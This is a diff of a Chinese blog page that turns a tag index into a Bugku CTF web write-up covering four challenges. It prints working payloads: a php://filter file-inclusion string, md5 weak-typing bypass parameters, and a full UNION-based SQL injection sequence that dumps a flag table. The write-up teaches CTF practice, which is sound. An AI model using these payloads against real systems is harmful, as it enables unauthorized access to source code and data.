@@ -108,23 +108,32 @@
 
 
 
-  <meta name="description" content="I&apos;m the master of my sea">
-<meta property="og:type" content="website">
-<meta property="og:title" content="KRDecad3&#39;s Blog">
-<meta property="og:url" content="https://KRDecad3.github.com/tags/Bugku/index.html">
+  <meta name="description" content="0x17flag在index里打开页面有一个链接，点击链接发现URL改变，则可能会有文件包含漏洞。利用php://filter伪协议，php://filter简单理解为用在对文件的读写操作上。payload:?file=php://filter/read=convert.base64-encode/resource=index.php得到一串base64编码，解码后网页源码，flag就在里面。">
+<meta name="keywords" content="Bugku,CTF,Writeup">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Bugku CTF Web(17-) Writeup">
+<meta property="og:url" content="https://KRDecad3.github.com/2018/07/20/Bugku-CTF-Web-（17-32）-Writeup/index.html">
 <meta property="og:site_name" content="KRDecad3&#39;s Blog">
-<meta property="og:description" content="I&apos;m the master of my sea">
+<meta property="og:description" content="0x17flag在index里打开页面有一个链接，点击链接发现URL改变，则可能会有文件包含漏洞。利用php://filter伪协议，php://filter简单理解为用在对文件的读写操作上。payload:?file=php://filter/read=convert.base64-encode/resource=index.php得到一串base64编码，解码后网页源码，flag就在里面。">
 <meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="https://img-blog.csdn.net/20180603173445381?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tSRGVjYWQz/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70">
+<meta property="og:image" content="https://img-blog.csdn.net/20180603173503543?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tSRGVjYWQz/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70">
+<meta property="og:image" content="https://img-blog.csdn.net/20180603173519877?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tSRGVjYWQz/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70">
+<meta property="og:image" content="https://img-blog.csdn.net/20180603173549963?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tSRGVjYWQz/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70">
+<meta property="og:image" content="https://img-blog.csdn.net/2018060317370542?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tSRGVjYWQz/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70">
+<meta property="og:image" content="https://img-blog.csdn.net/20180603173823790?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tSRGVjYWQz/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70">
+<meta property="og:updated_time" content="2018-07-19T16:18:35.294Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="KRDecad3&#39;s Blog">
-<meta name="twitter:description" content="I&apos;m the master of my sea">
+<meta name="twitter:title" content="Bugku CTF Web(17-) Writeup">
+<meta name="twitter:description" content="0x17flag在index里打开页面有一个链接，点击链接发现URL改变，则可能会有文件包含漏洞。利用php://filter伪协议，php://filter简单理解为用在对文件的读写操作上。payload:?file=php://filter/read=convert.base64-encode/resource=index.php得到一串base64编码，解码后网页源码，flag就在里面。">
+<meta name="twitter:image" content="https://img-blog.csdn.net/20180603173445381?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tSRGVjYWQz/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70">
 
 
 
 
 
 
-  <link rel="canonical" href="https://KRDecad3.github.com/tags/Bugku/"/>
+  <link rel="canonical" href="https://KRDecad3.github.com/2018/07/20/Bugku-CTF-Web-（17-32）-Writeup/"/>
 
 
 
@@ -134,7 +143,7 @@
   };
 </script>
 
-  <title>标签: Bugku | KRDecad3's Blog</title>
+  <title>Bugku CTF Web(17-) Writeup | KRDecad3's Blog</title>
   
 
 
@@ -181,7 +190,7 @@
     
   
 
-  <div class="container sidebar-position-right ">
+  <div class="container sidebar-position-right page-post-detail">
     <div class="headband"></div>
 
     <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
@@ -234,7 +243,7 @@
         
         
           
-          <li class="menu-item menu-item-tags menu-item-active">
+          <li class="menu-item menu-item-tags">
     <a href="/tags/" rel="section">
       <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />标签</a>
   </li>
@@ -314,252 +323,239 @@
           
             
 
-    
-    
-      
-      
-    
-      
-      
-    
-      
-      
-    
-      
-      
-    
-      
-      
-    
-    
-
-  
-
-
           
           <div id="content" class="content">
             
 
+  <div id="posts" class="posts-expand">
+    
+
+  
+
   
   
   
-  <div class="post-block tag">
 
-    <div id="posts" class="posts-collapse">
-      <div class="collection-title">
-        <h1>Bugku<small>标签</small>
-        </h1>
-      </div>
-
-      
-        
+  
 
   <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://KRDecad3.github.com/2018/07/20/Bugku-CTF-Web-（17-32）-Writeup/">
 
-      <h2 class="post-title">
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="KRDecad3">
+      <meta itemprop="description" content="I'm the master of my sea">
+      <meta itemprop="image" content="https://s1.ax1x.com/2018/07/19/P12BjO.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="KRDecad3's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
         
-            <a class="post-title-link" href="/2018/07/20/Bugku-CTF-Web-（17-32）-Writeup/" itemprop="url">
-              
-                <span itemprop="name">Bugku CTF Web(17-) Writeup</span>
-              
-            </a>
         
-      </h2>
+          <h1 class="post-title" itemprop="name headline">Bugku CTF Web(17-) Writeup
+              
+            
+          </h1>
+        
 
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated"
-              datetime="2018-07-20T00:17:08+08:00"
-              content="2018-07-20" >
-          07-20
-        </time>
-      </div>
+        <div class="post-meta">
+          <span class="post-time">
 
-    </header>
-  </article>
+            
+            
+            
 
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+
+              
+                
+              
+
+              <time title="创建时间：2018-07-20 00:17:08 / 修改时间：00:18:35" itemprop="dateCreated datePublished" datetime="2018-07-20T00:17:08+08:00">2018-07-20</time>
+            
+
+            
+              
+
+              
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
 
       
-        
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <h2 class="post-title">
-        
-            <a class="post-title-link" href="/2018/07/20/Bugku-CTF-Web-（1-16）-writeup/" itemprop="url">
-              
-                <span itemprop="name">Bugku CTF Web(1-16) writeup</span>
-              
-            </a>
-        
-      </h2>
-
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated"
-              datetime="2018-07-20T00:14:04+08:00"
-              content="2018-07-20" >
-          07-20
-        </time>
-      </div>
-
-    </header>
-  </article>
-
+      
 
       
-        
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <h2 class="post-title">
-        
-            <a class="post-title-link" href="/2018/07/20/Bugku-CTF-杂项（21-29）-Writeup/" itemprop="url">
-              
-                <span itemprop="name">Bugku CTF 杂项（21-29） Writeup</span>
-              
-            </a>
-        
-      </h2>
-
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated"
-              datetime="2018-07-20T00:11:29+08:00"
-              content="2018-07-20" >
-          07-20
-        </time>
-      </div>
-
-    </header>
-  </article>
-
-
-      
-        
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <h2 class="post-title">
-        
-            <a class="post-title-link" href="/2018/07/20/Bugku-CTF-杂项（13-20）-Writeup/" itemprop="url">
-              
-                <span itemprop="name">Bugku CTF 杂项（13-20） Writeup</span>
-              
-            </a>
-        
-      </h2>
-
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated"
-              datetime="2018-07-20T00:09:35+08:00"
-              content="2018-07-20" >
-          07-20
-        </time>
-      </div>
-
-    </header>
-  </article>
-
-
-      
-        
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <h2 class="post-title">
-        
-            <a class="post-title-link" href="/2018/07/20/Bugku-CTF-杂项（1-12）-Writeup/" itemprop="url">
-              
-                <span itemprop="name">Bugku CTF 杂项（1-12） Writeup</span>
-              
-            </a>
-        
-      </h2>
-
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated"
-              datetime="2018-07-20T00:06:33+08:00"
-              content="2018-07-20" >
-          07-20
-        </time>
-      </div>
-
-    </header>
-  </article>
-
-
-      
-        
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <h2 class="post-title">
-        
-            <a class="post-title-link" href="/2018/07/19/Bugku-CTF-代码审计-writeup/" itemprop="url">
-              
-                <span itemprop="name">Bugku CTF 代码审计 writeup</span>
-              
-            </a>
-        
-      </h2>
-
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated"
-              datetime="2018-07-19T23:53:19+08:00"
-              content="2018-07-19" >
-          07-19
-        </time>
-      </div>
-
-    </header>
-  </article>
-
-
-      
-        
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <h2 class="post-title">
-        
-            <a class="post-title-link" href="/2018/07/19/Bugku-CTF-加密writeup-（未完待续）/" itemprop="url">
-              
-                <span itemprop="name">Bugku CTF 加密writeup （未完待续）</span>
-              
-            </a>
-        
-      </h2>
-
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated"
-              datetime="2018-07-19T23:46:14+08:00"
-              content="2018-07-19" >
-          07-19
-        </time>
-      </div>
-
-    </header>
-  </article>
-
+        <h2 id="0x17flag在index里"><a href="#0x17flag在index里" class="headerlink" title="0x17flag在index里"></a>0x17flag在index里</h2><p><img src="https://img-blog.csdn.net/20180603173445381?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tSRGVjYWQz/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="这里写图片描述"><br>打开页面有一个链接，点击链接发现URL改变，<br><img src="https://img-blog.csdn.net/20180603173503543?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tSRGVjYWQz/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="这里写图片描述"><br>则可能会有文件包含漏洞。<br>利用php://filter伪协议，php://filter简单理解为用在对文件的读写操作上。<br><code>payload:</code><br><code>?file=php://filter/read=convert.base64-encode/resource=index.php</code><br>得到一串base64编码，解码后网页源码，flag就在里面。<br><img src="https://img-blog.csdn.net/20180603173519877?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tSRGVjYWQz/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="这里写图片描述"></p>
+<hr>
+<h2 id="0x18输入密码查看flag"><a href="#0x18输入密码查看flag" class="headerlink" title="0x18输入密码查看flag"></a>0x18输入密码查看flag</h2><p><img src="https://img-blog.csdn.net/20180603173549963?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tSRGVjYWQz/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="这里写图片描述"><br>用burp的Intruder暴破，在网上找一找五位的密码字典加载进去，看长度不一样的就是口令了。<br>自己找了好几个都没有暴出来。</p>
+<hr>
+<h2 id="0x19备份是个好习惯"><a href="#0x19备份是个好习惯" class="headerlink" title="0x19备份是个好习惯"></a>0x19备份是个好习惯</h2><p><a href="https://www.secpulse.com/archives/55286.html" target="_blank" rel="noopener">常见Web源码泄露总结</a><br>若存在源码泄露，则尝试访问index.php.bak下载源码，<br><img src="https://img-blog.csdn.net/2018060317370542?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tSRGVjYWQz/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="这里写图片描述"><br>函数<br>strstr(str1, str2)判断str2是否是str1的子串；<br>substr(str, start[,length])返回字符串的一部分；<br>str_replace()以其他字符替换字符串中的一些字符（区分大小写）。<br>同时有md5验证相等，且key1不等于key2。<br>双写变量名，构造数组或弱类型绕过。<br><code>payload:</code><br><code>?kekeyy1[]=1&amp;kekeyy2[]=2</code><br><code>?kekeyy1=240610708&amp;kekeyy2=QNKCDZO</code></p>
+<hr>
+<h2 id="0x20成绩单"><a href="#0x20成绩单" class="headerlink" title="0x20成绩单"></a>0x20成绩单</h2><p><img src="https://img-blog.csdn.net/20180603173823790?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tSRGVjYWQz/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="这里写图片描述"><br>页面里有一个POST表单，测试会不会有注入漏洞<br>POST里<br><code>id=1&#39;</code>和<code>id=1&#39;#</code><br><code>id=1&#39; and 1=2#</code>和<code>id=1&#39; and 1=1#</code><br>前一个不回显后一个回显，那么说明存在注入。<br>判断字段数：有四个字段<br><code>id=1&#39; order by 4#</code><br>判断回显位：<br><code>id=1&#39; union select 1,2,3,4#</code><br>查数据库：出现skctf_flag<br><code>id=0&#39; union select 1,2,3,database()#</code><br>查数据表：出现fl4g, sc<br><code>id=0&#39; union select 1,2,3,group_concat(table_name) from information_schema.tables where table_schema=&#39;skctf_flag&#39;#</code><br>查fl4g字段：得到记录名skctf_flag<br><code>id=0&#39; union select 1,2,3,group_concat(column_name) from information_schema.columns where table_name=&#39;fl4g&#39;#</code><br>查询数据：<br><code>id=0&#39; union select 1,2,3,skctf_flag from fl4g#</code><br>得到flag。</p>
 
       
     </div>
 
+    
+
+    
+    
+    
+
+    
+
+    
+      <div>
+        <div style="padding: 10px 0; margin: 20px auto; width: 90%; text-align: center;">
+  <div></div>
+  <button id="rewardButton" disable="enable" onclick="var qr = document.getElementById('QR'); if (qr.style.display === 'none') {qr.style.display='block';} else {qr.style.display='none'}">
+    <span>打赏</span>
+  </button>
+  <div id="QR" style="display: none;">
+
+    
+      <div id="wechat" style="display: inline-block">
+        <img id="wechat_qr" src="/images/IMG_20180719_203147.jpg" alt="KRDecad3 微信支付"/>
+        <p>微信支付</p>
+      </div>
+    
+
+    
+      <div id="alipay" style="display: inline-block">
+        <img id="alipay_qr" src="/images/IMG_20180720_002926.jpg" alt="KRDecad3 支付宝"/>
+        <p>支付宝</p>
+      </div>
+    
+
+    
+
+  </div>
+</div>
+
+      </div>
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/Bugku/" rel="tag"># Bugku</a>
+          
+            <a href="/tags/CTF/" rel="tag"># CTF</a>
+          
+            <a href="/tags/Writeup/" rel="tag"># Writeup</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/07/20/Bugku-CTF-Web-（1-16）-writeup/" rel="next" title="Bugku CTF Web(1-16) writeup">
+                <i class="fa fa-chevron-left"></i> Bugku CTF Web(1-16) writeup
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
   </div>
   
   
   
+  </article>
 
-  
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
 
 
           </div>
           
+
+  
+    <div class="comments" id="comments">
+      <div id="lv-container" data-id="city" data-uid="MTAyMC8zODE5OS8xNDcyNw=="></div>
+    </div>
+
+  
+
+
 
         </div>
         
@@ -580,8 +576,17 @@
       
 
       
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
 
-      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
+      <section class="site-overview-wrap sidebar-panel">
         <div class="site-overview">
           <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
             
@@ -673,6 +678,22 @@
         </div>
       </section>
 
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x17flag在index里"><span class="nav-number">1.</span> <span class="nav-text">0x17flag在index里</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x18输入密码查看flag"><span class="nav-number">2.</span> <span class="nav-text">0x18输入密码查看flag</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x19备份是个好习惯"><span class="nav-number">3.</span> <span class="nav-text">0x19备份是个好习惯</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x20成绩单"><span class="nav-number">4.</span> <span class="nav-text">0x20成绩单</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
       
 
       
@@ -807,6 +828,10 @@
 
 
   
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=6.3.0"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=6.3.0"></script>
+
+
 
   
 
@@ -825,6 +850,17 @@
 
 
 
+  
+    <script type="text/javascript">
+      (function(d, s) {
+        var j, e = d.getElementsByTagName(s)[0];
+        if (typeof LivereTower === 'function') { return; }
+        j = d.createElement(s);
+        j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+        j.async = true;
+        e.parentNode.insertBefore(j, e);
+      })(document, 'script');
+    </script>
   
 
 
